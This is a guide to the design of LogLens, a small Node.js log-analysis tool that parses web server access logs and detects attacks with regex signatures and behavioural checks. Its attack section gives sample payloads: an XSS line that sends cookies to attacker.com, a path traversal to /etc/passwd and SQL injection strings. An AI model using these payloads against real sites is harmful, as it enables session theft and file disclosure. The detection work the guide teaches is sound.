# LogLens — Complete Concepts Guide
### Every technology and idea explained from the ground up

> By the end of this document you will understand every design decision in LogLens —
> not just what the code does, but *why* it works that way.

---

## Table of Contents

1. [What a Web Server Log Actually Is](#1-what-a-web-server-log-actually-is)
2. [What is a SIEM?](#2-what-is-a-siem)
3. [Regex — The Core Technology](#3-regex--the-core-technology)
4. [The CLF Regex Dissected Line by Line](#4-the-clf-regex-dissected-line-by-line)
5. [Streaming vs Loading — The Memory Problem](#5-streaming-vs-loading--the-memory-problem)
6. [Node.js Streams and readline](#6-nodejs-streams-and-readline)
7. [EventEmitter — The Observer Pattern](#7-eventemitter--the-observer-pattern)
8. [The Async Job Queue Pattern](#8-the-async-job-queue-pattern)
9. [Signature Detection — How Regex Catches Attacks](#9-signature-detection--how-regex-catches-attacks)
10. [Behavioral Analysis — Stateful Threat Detection](#10-behavioral-analysis--stateful-threat-detection)
11. [The Sliding Window Algorithm](#11-the-sliding-window-algorithm)
12. [GeoIP — Mapping IPs to Countries](#12-geoip--mapping-ips-to-countries)
13. [Data Aggregation — Building the Report](#13-data-aggregation--building-the-report)
14. [Recharts — Data Visualisation in React](#14-recharts--data-visualisation-in-react)
15. [Every File Explained](#15-every-file-explained)
16. [Attack Type Deep Dive](#16-attack-type-deep-dive)
17. [Performance Analysis](#17-performance-analysis)
18. [The Threat Model — What LogLens Finds and Misses](#18-the-threat-model--what-loglens-finds-and-misses)

---

## 1. What a Web Server Log Actually Is

Every time someone visits your website, the web server (Apache or Nginx) writes one line to a log file. That line records everything about the request.

### The Common Log Format (CLF)

```
127.0.0.1 - frank [10/Oct/2000:13:55:36 -0700] "GET /index.html HTTP/1.1" 200 2326
```

Let's decode every field:

| Field | Example | Meaning |
|-------|---------|---------|
| IP address | `127.0.0.1` | Who made the request (client's IP) |
| ident | `-` | RFC 1413 identity — almost always "-", ignore it |
| user | `frank` | Authenticated username (or "-" if not logged in) |
| timestamp | `[10/Oct/2000:13:55:36 -0700]` | When the request happened |
| method | `GET` | HTTP verb (GET=read, POST=submit, PUT=update, DELETE=remove) |
| path | `/index.html` | What URL was requested |
| protocol | `HTTP/1.1` | HTTP version |
| status | `200` | HTTP response code (200=OK, 404=not found, 500=server error) |
| size | `2326` | Response size in bytes |

**Combined Log Format** adds two more fields at the end:

```
... "http://www.referrer.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
```

| Field | Meaning |
|-------|---------|
| Referer | What page the user came from |
| User-Agent | What browser/tool made the request |

The User-Agent is gold for threat detection — tools like sqlmap and Nikto advertise themselves in the User-Agent.

### What a Day's Log Looks Like

A busy web server might log 10 million lines per day. That's roughly 2GB of text. LogLens must process this without crashing, which is why streaming matters (section 5).

---

## 2. What is a SIEM?

**SIEM = Security Information and Event Management**

A SIEM is a system that:
1. **Collects** logs from many sources (web servers, firewalls, databases)
2. **Normalises** them into a standard format
3. **Correlates** events across sources to find patterns
4. **Alerts** on suspicious patterns
5. **Visualises** the threat landscape

Commercial SIEMs include Splunk ($50k–$500k/year), IBM QRadar, and Microsoft Sentinel.

**LogLens is a "SIEM-lite"** — it implements the core of this pipeline for a single log source (Apache/Nginx access logs) in a way that's understandable and runnable by a single developer.

### The LogLens Pipeline

```
Raw log file
    ↓ (parser.js)
Structured ParsedLine objects
    ↓ (detector.js — per-line)
Signature threat matches
    ↓ (detector.js — cross-line)
Behavioral findings
    ↓ (geoip.js)
Geographic enrichment
    ↓ (detector.js — buildReport)
Aggregated JSON report
    ↓ (Dashboard.jsx)
Visual charts and tables
```

Each stage transforms the data into something more useful.

---

## 3. Regex — The Core Technology

Regular expressions (regex) are patterns that match text. They are the most important skill in this entire project.

### Basic Regex Concepts

| Symbol | Meaning | Example | Matches |
|--------|---------|---------|---------|
| `.` | Any single character | `a.c` | "abc", "a1c", "a-c" |
| `*` | 0 or more of previous | `ab*c` | "ac", "abc", "abbc" |
| `+` | 1 or more of previous | `ab+c` | "abc", "abbc" (NOT "ac") |
| `?` | 0 or 1 of previous | `ab?c` | "ac", "abc" |
| `\d` | Any digit | `\d{3}` | "123", "404", "500" |
| `\S` | Any non-space char | `\S+` | "GET", "127.0.0.1" |
| `[...]` | Character class | `[abc]` | "a", "b", or "c" |
| `(?:...)` | Non-capturing group | `(?:ab)+` | "ab", "abab" |
| `(?<name>...)` | Named capture group | `(?<ip>\S+)` | Captures into `groups.ip` |
| `^` | Start of string | `^\d` | String starting with a digit |
| `i` flag | Case-insensitive | `/select/i` | "select", "SELECT", "Select" |

### A Simple Regex Attack

SQL injection often contains `OR 1=1`. Let's write a regex for it:

```javascript
// Naive approach:
/OR 1=1/i

// Matches: "OR 1=1"  ✓
// Misses:  "OR  1=1" (extra space)  ✗
// Misses:  "OR 1 =1" (space before =) ✗

// Better — allow whitespace between tokens:
/OR\s+1\s*=\s*1/i

// Matches: "OR 1=1", "OR  1 = 1", "OR\t1=1"  ✓
```

This is why regex for security signatures needs to be carefully crafted — attackers add spaces, tabs, and other tricks to evade simple patterns.

---

## 4. The CLF Regex Dissected Line by Line

Here is the main parser regex, broken apart:

```javascript
const CLF_REGEX = /
  ^                          // Start of line
  (?<ip>\S+)                 // Named group "ip": one or more non-space chars
  \s+                        // One or more spaces
  (?<ident>\S+)              // Named group "ident": usually "-"
  \s+                        // Space
  (?<user>\S+)               // Named group "user": username or "-"
  \s+                        // Space
  \[(?<timestamp>[^\]]+)\]   // Timestamp: [anything except ]] between [ ]
  \s+                        // Space
  "                          // Opening quote of request line
    (?<method>\S+)           // Named group "method": GET, POST, etc.
    \s+                      // Space
    (?<path>\S+)             // Named group "path": /index.html
    \s+                      // Space
    (?<protocol>[^"]+)       // Named group "protocol": HTTP/1.1
  "                          // Closing quote
  \s+                        // Space
  (?<status>\d{3})           // Named group "status": exactly 3 digits
  \s+                        // Space
  (?<size>\S+)               // Named group "size": number or "-"
  (?:                        // Optional group (?) for Combined Format:
    \s+"(?<referer>[^"]*)"   //   space + quoted referer
    \s+"(?<useragent>[^"]*)" //   space + quoted user-agent
  )?                         // End optional group
/x;  // (x flag = ignore whitespace for readability — not in actual code)
```

### Why Named Capture Groups?

Without named groups:
```javascript
const match = line.match(CLF_REGEX);
const ip    = match[1];         // Which index is IP? Have to count...
const user  = match[3];         // Is this user? Or ident?
```

With named groups:
```javascript
const { ip, user, status, path } = match.groups;  // Crystal clear
```

---

## 5. Streaming vs Loading — The Memory Problem

This is one of the most important concepts in backend engineering.

### What "Loading" Means

```javascript
// This loads the ENTIRE file into RAM at once
const content = fs.readFileSync('access.log', 'utf8');
```

When you call `readFileSync` on a 500MB file:
1. Node.js asks the OS for 500MB of memory
2. The OS allocates it from RAM
3. The file's bytes are copied into that memory
4. JavaScript creates a string object (which uses MORE memory — ~2× the file size)
5. If your server only has 1GB RAM, this might crash it

### What "Streaming" Means

Imagine reading a book:
- **Loading** = photocopying the entire book before reading one word
- **Streaming** = reading one page at a time, then moving to the next

```javascript
// Streaming: processes one line at a time
const readStream = createReadStream('access.log', {
  highWaterMark: 64 * 1024  // read 64KB at a time from disk
});
const rl = createInterface({ input: readStream });

rl.on('line', (rawLine) => {
  // This line is in memory right now
  // After we process it and move on, JavaScript garbage-collects it
  const parsed = parseLine(rawLine);
  // ... do something with parsed
  // rawLine and parsed are eligible for garbage collection now
});
```

The OS reads 64KB from disk → extracts lines → emits line events → garbage collects → reads the next 64KB. Maximum memory usage: ~2–3× 64KB = ~200KB, regardless of whether the file is 1MB or 10GB.

### Memory Comparison

```
File size: 500MB

readFileSync approach:
  RAM peak: ~1.2GB (500MB × ~2.4 for JS string overhead)
  Risk: Out of memory crash

Streaming approach:
  RAM peak: ~50MB (Node.js overhead + current chunk + current line)
  Risk: None — constant memory regardless of file size
```

---

## 6. Node.js Streams and readline

### What is a Stream?

A Node.js stream is an object that emits data in chunks over time, instead of all at once. There are four types:

| Type | Description | Example |
|------|-------------|---------|
| Readable | Produces data | `fs.createReadStream()` |
| Writable | Consumes data | `fs.createWriteStream()` |
| Duplex | Both | Network sockets |
| Transform | Modify as it flows | `zlib.createGzip()` |

`createReadStream()` creates a Readable stream from a file. It reads the file in chunks (default 64KB) and emits `'data'` events.

### What is readline?

`readline.createInterface()` wraps a Readable stream and buffers the incoming data until it finds a newline character (`\n`). Then it emits a `'line'` event with the complete line.

```javascript
// createReadStream emits:  "127.0.0.1 - frank [10/O"  (chunk 1)
// createReadStream emits:  "ct/2000]\n192.168.1.1..."  (chunk 2)
//                                    ↑ newline found!
// readline emits:          "127.0.0.1 - frank [10/Oct/2000]"   (line!)
// readline buffers:        "192.168.1.1..."  (next line in progress)
```

This is why `readline` exists — it reassembles complete log lines from raw byte chunks.

---

## 7. EventEmitter — The Observer Pattern

### What is EventEmitter?

`EventEmitter` is Node.js's built-in publish/subscribe system. An emitter can emit named events, and listeners subscribe to those events.

```javascript
import { EventEmitter } from 'events';

const emitter = new EventEmitter();

// Subscribe (before emitting)
emitter.on('line', (parsedLine) => {
  console.log('Got a line:', parsedLine.ip);
});

emitter.on('done', (stats) => {
  console.log('Finished! Parsed:', stats.parsed, 'lines');
});

// Later, the emitter fires:
emitter.emit('line', { ip: '127.0.0.1', path: '/index.html', ... });
emitter.emit('done', { total: 5000, parsed: 4998, skipped: 2 });
```

### Why LogLens Uses EventEmitter for Parsing

`streamParseFile()` returns an EventEmitter. This lets the caller react to each line as it arrives:

```javascript
const emitter = streamParseFile('/path/to/access.log', fileSize);

emitter.on('line', (parsedLine) => {
  // Run threat detection on this line IMMEDIATELY
  // Don't wait for all lines to be parsed
  const threats = detectSignatureThreats(parsedLine);
  behavioral.ingest(parsedLine);
});

emitter.on('progress', ({ pct }) => {
  // Update the job's progress for the polling frontend
  job.progress = pct;
});

emitter.on('done', ({ total, parsed }) => {
  // All lines processed — now do behavioral analysis
  const findings = behavioral.analyze();
});
```

This is the **Observer Pattern** — a design pattern where objects "observe" events from other objects without tight coupling.

---

## 8. The Async Job Queue Pattern

### Why We Need It

Processing a 500MB log takes 30–60 seconds. HTTP has a ~30s timeout. If the client uploads and waits for the response, the connection will time out.

### The Pattern: Upload → Poll → Report

```
Step 1: Upload
Client → POST /api/upload (multipart form, 500MB file)
Server → { jobId: "abc-123" }   ← Returns in <500ms

The server started processing in the background.
The HTTP connection is already closed.

Step 2: Poll
Client → GET /api/jobs/abc-123
Server → { status: 'running', progress: 23 }  ← Returns in <5ms
(Client waits 1.5 seconds)

Client → GET /api/jobs/abc-123
Server → { status: 'running', progress: 51 }

Client → GET /api/jobs/abc-123
Server → { status: 'done', progress: 100 }

Step 3: Fetch Report
Client → GET /api/jobs/abc-123/report
Server → { summary: {...}, topAttackers: [...], timeline: [...] }
         ← Full JSON report, instantly (already computed and saved)
```

### Why `setImmediate` Instead of `await`?

In `createJob()`:
```javascript
export function createJob(opts) {
  const jobId = uuidv4();
  jobs.set(jobId, { id: jobId, status: 'queued', ... });

  setImmediate(() => processJob(jobId));  // ← Key line
  //             ↑
  // setImmediate defers execution to "after the current event loop tick"
  // This means: return jobId to the caller FIRST, then start processing

  return jobId;  // Returns immediately, before processJob runs
}
```

`setImmediate` vs `await`:
- `await processJob(jobId)` would block until processing finishes (we'd be waiting 60 seconds)
- `setImmediate(() => processJob(jobId))` schedules processing for "as soon as possible, but not right now"

This is how Node.js achieves concurrency without threads — the event loop.

---

## 9. Signature Detection — How Regex Catches Attacks

### The Compilation Step

```javascript
// At server startup — compile all 30 patterns ONCE
const COMPILED_SIGS = signatures.flatMap(([type, patterns]) =>
  patterns.map(sig => ({
    ...sig,
    type,
    regex: new RegExp(sig.pattern, 'i'),  // ← compiled here
  }))
);
```

**Why compile once?** Creating a `new RegExp(pattern)` parses the pattern into an internal state machine. This takes ~1ms per pattern. If you compiled during matching:

```
30 patterns × 10,000,000 lines × 1ms = 300,000 seconds ← catastrophic
```

Compiled once at startup:
```
30 patterns × 1ms = 30ms at startup
Then: 30 state machine executions per line (much faster than compilation)
10,000,000 lines × 30 executions × 0.001ms ≈ 5 minutes total (acceptable)
```

### Testing Multiple Fields

Attackers don't only put payloads in the path. They hide them everywhere:

```javascript
for (const field of ['path', 'query', 'userAgent']) {
  if (sig.regex.test(line[field])) {
    threats.push({ ... });
    break;  // Don't report same sig from two fields
  }
}
```

**Example — User-Agent attack:**
```
GET /normal-looking-page HTTP/1.1
User-Agent: sqlmap/1.7.8 (https://sqlmap.org)
```

The path looks innocent. The User-Agent reveals it's sqlmap. Our `SCAN-002` signature catches it:
```json
{ "pattern": "(?:sqlmap|havij|pangolin)", "severity": "high" }
```

---

## 10. Behavioral Analysis — Stateful Threat Detection

Signature matching is stateless — each line is independent. Behavioral analysis is stateful — it builds a picture of each IP's behaviour over time.

### The BehavioralAnalyzer Class

```javascript
export class BehavioralAnalyzer {
  constructor() {
    this.ipStates = new Map();  // Map<ip, IPState>
  }

  ingest(line) {
    // Called for EVERY line during streaming
    const state = this.getOrCreate(line.ip);
    state.requests.push({ ts: line.timestamp.getTime(), ... });
    if (line.status === 401) state.paths401.push(line.timestamp.getTime());
    if (line.method === 'POST') state.postCount++;
    // ... more tracking
  }

  analyze() {
    // Called ONCE after all lines are ingested
    const findings = [];
    for (const [ip, state] of this.ipStates) {
      // Check each IP's accumulated state for suspicious patterns
    }
    return findings;
  }
}
```

### Why a Map<ip, IPState>?

A `Map` is a key-value store where keys can be any type (not just strings as in plain objects). We need O(1) lookup by IP to update the state for each line:

```javascript
// Without Map: O(n) lookup — slow for many IPs
const ipState = states.find(s => s.ip === line.ip);

// With Map: O(1) lookup — instant regardless of number of IPs
const ipState = this.ipStates.get(line.ip);
```

For 10 million lines with 10,000 unique IPs:
- Array find: 10M × average 5,000 comparisons = 50 billion operations
- Map.get: 10M × 1 hash lookup = 10 million operations

---

## 11. The Sliding Window Algorithm

Brute force detection requires finding if N events occurred within a time window.

### Naive Approach — O(n²)

```javascript
// For each event, count how many events are within windowMs
// This is O(n²) — too slow for millions of events
for (let i = 0; i < events.length; i++) {
  let count = 0;
  for (let j = 0; j < events.length; j++) {
    if (Math.abs(events[i] - events[j]) <= windowMs) count++;
  }
  if (count > threshold) return true;
}
```

### Sliding Window — O(n log n)

```javascript
_countInWindow(timestamps, windowMs, threshold) {
  const sorted = [...timestamps].sort((a, b) => a - b);  // O(n log n)
  let maxInWindow = 0;
  let left = 0;  // Left pointer

  for (let right = 0; right < sorted.length; right++) {
    // Shrink window from left if it's too wide
    while (sorted[right] - sorted[left] > windowMs) {
      left++;  // Move left pointer right
    }
    // Current window: [left...right] — all within windowMs
    maxInWindow = Math.max(maxInWindow, right - left + 1);
  }
  return maxInWindow >= threshold ? maxInWindow : 0;
}
```

**Visualised:**

```
Timestamps (sorted): [1, 2, 3, 50, 51, 52, 53, 54, 100]
Window size:          10 seconds
Threshold:            5

Step: right=0, left=0: window=[1],    size=1
Step: right=1, left=0: window=[1,2],  size=2
Step: right=2, left=0: window=[1,2,3],size=3
Step: right=3, left=0: [1..50]>10 → move left until [50], size=1
Step: right=4, left=3: window=[50,51],size=2
Step: right=5, left=3: window=[50,51,52], size=3
Step: right=6, left=3: window=[50,51,52,53], size=4
Step: right=7, left=3: window=[50,51,52,53,54], size=5 ← maxInWindow=5!

Result: 5 ≥ threshold(5) → BRUTE FORCE DETECTED
```

This is O(n log n) because of the sort. The two-pointer scan is O(n). Much faster than the naive O(n²) approach.

---

## 12. GeoIP — Mapping IPs to Countries

### What GeoIP Is

Every IP address is registered to an organisation in a specific country. GeoIP databases map IP ranges to locations:

```
203.0.113.0  → United States → New York → Cloudflare
185.220.101.0 → Germany → Frankfurt → Tor exit node
45.33.32.0   → United States → Atlanta → Linode
```

### How LogLens Does It

We use [ip-api.com](https://ip-api.com) — a free API that accepts an IP and returns JSON:

```javascript
const url  = `http://ip-api.com/json/203.0.113.45`;
const data = await fetch(url).then(r => r.json());
// data = {
//   status: "success",
//   country: "United States",
//   countryCode: "US",
//   city: "Los Angeles",
//   lat: 34.0522, lon: -118.2437,
//   isp: "ARIN",
//   proxy: false
// }
```

### Rate Limiting and Caching

ip-api.com allows 45 requests/minute for free. A log with 1,000 unique attacker IPs would require 1,000 lookups = ~22 minutes. Strategies:

1. **Only enrich top 10 attackers** — the ones that matter most
2. **24-hour in-memory cache** — same IP never looked up twice in a day
3. **1.4-second delay between requests** — stays under the rate limit

### Private IP Detection

`10.x.x.x`, `192.168.x.x`, `127.0.0.1` are private network IPs — they never appear on the public internet. No GeoIP lookup needed:

```javascript
const PRIVATE_RANGES = [
  /^10\./,
  /^172\.(1[6-9]|2\d|3[01])\./,
  /^192\.168\./,
  /^127\./,
];
```

---

## 13. Data Aggregation — Building the Report

After parsing and detection, raw data must be aggregated into useful summaries.

### IP Attack Summary (Top Attackers)

```javascript
const ipMap = new Map();

for (const [lineNum, threats] of lineThreats) {
  const line = lines[lineNum - 1];
  if (!ipMap.has(line.ip)) {
    ipMap.set(line.ip, { ip: line.ip, threatCount: 0, types: new Set() });
  }
  const entry = ipMap.get(line.ip);
  entry.threatCount += threats.length;
  threats.forEach(t => entry.types.add(t.type));
}

// Sort by threat count, take top 20
const topAttackers = [...ipMap.values()]
  .sort((a, b) => b.threatCount - a.threatCount)
  .slice(0, 20);
```

### Timeline — Attacks Per Hour

```javascript
const hourBuckets = new Map();

for (const [lineNum, threats] of lineThreats) {
  const line    = lines[lineNum - 1];
  const hourKey = new Date(line.timestamp);
  hourKey.setMinutes(0, 0, 0);      // Round down to hour
  const key = hourKey.toISOString(); // "2024-01-15T08:00:00.000Z"

  hourBuckets.set(key, (hourBuckets.get(key) || 0) + threats.length);
}

// Result: [{ hour: "2024-01-15T08:00:00Z", count: 42 }, ...]
```

This produces the data for the Timeline line chart. Each point = one hour, height = number of threats detected that hour.

---

## 14. Recharts — Data Visualisation in React

Recharts is a React charting library built on D3.js. Every chart is a React component.

### LineChart (Timeline)

```jsx
<ResponsiveContainer width="100%" height={200}>
  <LineChart data={timelineData}>
    {/* Grid lines */}
    <CartesianGrid strokeDasharray="3 3" />

    {/* X axis: hour labels */}
    <XAxis dataKey="hour" />

    {/* Y axis: attack count */}
    <YAxis />

    {/* Tooltip on hover */}
    <Tooltip />

    {/* The actual line */}
    <Line
      type="monotone"     // smooth curve
      dataKey="attacks"   // uses data.attacks for Y value
      stroke="#ef4444"    // red line
      strokeWidth={2}
    />
  </LineChart>
</ResponsiveContainer>
```

`data` prop is just an array of objects:
```javascript
[
  { hour: "08:00", attacks: 12 },
  { hour: "09:00", attacks: 47 },
  { hour: "10:00", attacks: 8 },
]
```

### PieChart (Attack Types)

```jsx
<PieChart>
  <Pie
    data={pieData}
    dataKey="value"   // the numeric value for each slice
    cx="50%" cy="50%" // centre
    outerRadius={80}
  >
    {pieData.map((_, i) => (
      <Cell key={i} fill={TYPE_COLOR[i % TYPE_COLOR.length]} />
    ))}
  </Pie>
  <Tooltip />
</PieChart>
```

### ResponsiveContainer

Wraps any Recharts chart and makes it resize with the browser window:

```jsx
<ResponsiveContainer width="100%" height={200}>
  {/* chart here */}
</ResponsiveContainer>
```

---

## 15. Every File Explained

### Backend

**`parser.js`**
The log reader. Two key exports:
- `parseLine(line, lineNum)` — parses one string into a `ParsedLine` object using CLF_REGEX
- `streamParseFile(filePath, fileSize)` — creates a ReadStream → readline → EventEmitter pipeline. Returns an EventEmitter that emits `'line'`, `'progress'`, `'done'`, `'error'`

**`detector.js`**
The threat engine. Three key exports:
- `detectSignatureThreats(line)` — tests one ParsedLine against 30 compiled regexes. Returns array of Threat objects
- `BehavioralAnalyzer` class — call `.ingest(line)` for every line, then `.analyze()` after all lines
- `buildReport(lines, lineThreats, behavioral)` — aggregates everything into the final report structure

**`signatures.json`**
The rulebook. A JSON object where each key is an attack category and the value is an array of signature objects `{ id, pattern, severity, description }`. Adding new signatures requires no code changes.

**`geoip.js`**
IP geolocation. `lookupIP(ip)` calls ip-api.com (with caching and rate limiting). `batchLookupIPs(ips[])` processes multiple IPs with delay between requests.

**`jobs.js`**
The orchestrator. `createJob(opts)` creates a job record and starts processing via `setImmediate`. `getJobStatus(jobId)` returns the current state for polling. `processJob(jobId)` runs the full pipeline: parse → detect → behavioral → geoip → report → save.

**`db.js`**
SQLite persistence. Two tables: `reports` (stores the full JSON report per job). Functions: `saveReport`, `getReport`, `listReports`.

**`routes/upload.js`**
Five Express routes: `POST /upload`, `GET /jobs/:id`, `GET /jobs/:id/report`, `GET /reports`, `GET /demo`.

**`server.js`**
Express app bootstrap: Helmet + CORS + rate-limiting + Morgan + routes.

### Frontend

**`UploadPage.jsx`**
File drop zone + upload + polling loop. State machine: `idle → uploading → polling → (navigate to /report/:id) → done`.

**`Dashboard.jsx`**
Loads the report via `GET /api/jobs/:id/report` and renders:
- 4 stat cards (total lines, threats, attackers, behavioral alerts)
- Severity row (critical/high/medium/low counts)
- Timeline LineChart
- Attack Types PieChart + Status Codes BarChart
- Behavioral alerts table
- Top attackers table (with GeoIP)
- Threat lines sample (first 20 flagged lines)

---

## 16. Attack Type Deep Dive

### SQL Injection

**What it is:** Attacker inserts SQL code into a request parameter to manipulate the database query.

**Real example:**
```
Normal:  SELECT * FROM users WHERE id = 1
Injected: SELECT * FROM users WHERE id = 1 OR 1=1
Result:   Returns ALL users (not just id=1)
```

**Why our regex catches it:**
```javascript
/(?:union.{0,20}select|select.{0,20}from)/i
```
- `union.{0,20}select` — "union" followed by up to 20 any characters, then "select"
- The `.{0,20}` handles spaces, URL encoding artifacts, etc.
- `i` flag = case-insensitive (SQL keywords are case-insensitive)

### Cross-Site Scripting (XSS)

**What it is:** Attacker injects JavaScript into a web page that runs in other users' browsers.

**Real example:**
```
Normal search: /search?q=shoes
XSS attempt:   /search?q=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
```

**Why we also test the User-Agent:**
Some XSS testing tools put payloads in headers to test if the app reflects headers back to the page.

### Path Traversal / LFI

**What it is:** Using `../` sequences to escape the web root and read arbitrary files.

**Real example:**
```
Normal:    /download?file=report.pdf
Attack:    /download?file=../../../../etc/passwd
Result:    Server returns /etc/passwd (list of system users)
```

**Multi-level URL decoding matters here:**
```
/download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd
         →    ../../etc/passwd               (after one decode)
```

### Brute Force

**What it is:** Automated repeated login attempts to guess passwords.

**How we detect it:** Not by content (the request looks normal) but by frequency:
```
192.0.2.88 POST /login 401   08:03:01
192.0.2.88 POST /login 401   08:03:02
192.0.2.88 POST /login 401   08:03:03
... ×50 more in 60 seconds

→ 50 × 401 from same IP in 5 minutes = BRUTE FORCE
```

The signature engine would miss this entirely. Only behavioral analysis catches it.

---

## 17. Performance Analysis

### Time Complexity

| Phase | Complexity | Bottleneck |
|-------|-----------|------------|
| Streaming parse | O(L × R) | L=lines, R=regex complexity |
| Signature detection | O(L × S) | S=number of signatures (30) |
| Behavioral ingestion | O(L) | Map.get() is O(1) |
| Sliding window sort | O(U × A log A) | U=unique IPs, A=401 count per IP |
| Aggregation | O(L + T) | T=threat lines |
| GeoIP | O(min(10, U)) | Capped at 10 lookups |

Total: approximately O(L × S) — linear in log lines × constant signature count.

### Space Complexity

| Data Structure | Size |
|---------------|------|
| Current stream chunk | 64 KB (constant) |
| ParsedLine array | O(L) — grows with log size |
| lineThreats Map | O(T) where T ≪ L |
| ipStates Map | O(U × A) where U=unique IPs |
| Report JSON | O(20 + U + T) — bounded |

The `ParsedLine[]` array is the main memory consumer. For 10M lines: ~10M × ~200 bytes/line ≈ 2GB. For production, you'd stream results directly to the database rather than accumulating in memory.

---

## 18. The Threat Model — What LogLens Finds and Misses

### What LogLens Finds

| ✅ Detected | How |
|------------|-----|
| SQL injection in URL parameters | SQLi-001–006 signatures |
| XSS in request paths | XSS-001–006 signatures |
| Path traversal attempts | LFI-001–005 signatures |
| Command injection | CMD-001–004 signatures |
| Known scanner tools | SCAN-001–004 user-agent matching |
| Admin panel probing | CRED-001–003 path matching |
| Brute force login | Behavioral: 401 frequency |
| Directory scanning | Behavioral: unique path count |
| DoS / high volume | Behavioral: request rate |
| Credential stuffing | Behavioral: POST login rate |

### What LogLens Misses

| ❌ Not Detected | Why |
|----------------|-----|
| Attacks in POST body | Access logs don't log request bodies |
| Successful attacks | Need to correlate with app logs |
| Encrypted attack tools | Tool using custom user-agent |
| Novel attack patterns | No signature exists yet |
| Slow/distributed brute force | Window too wide, split across IPs |
| Application-layer attacks | Need WAF + app-level logging |

### The Key Insight

Web server access logs only contain what's visible in the HTTP request line (method + path + protocol), headers (user-agent, referer), and response (status + size). POST bodies, cookies, and application data are invisible. A complete security picture requires:

1. **Access logs** (LogLens) — network-level threats
2. **Application logs** — business-logic attacks
3. **Database logs** — data exfiltration
4. **System logs** — privilege escalation

Real SIEMs correlate all four. LogLens is the first layer.

---

*End of LogLens Concepts Guide*
*~5,000 words covering: CLF parsing, regex, Node.js streams, EventEmitter, the job queue pattern, sliding window algorithm, GeoIP, data aggregation, Recharts, and the full threat model.*
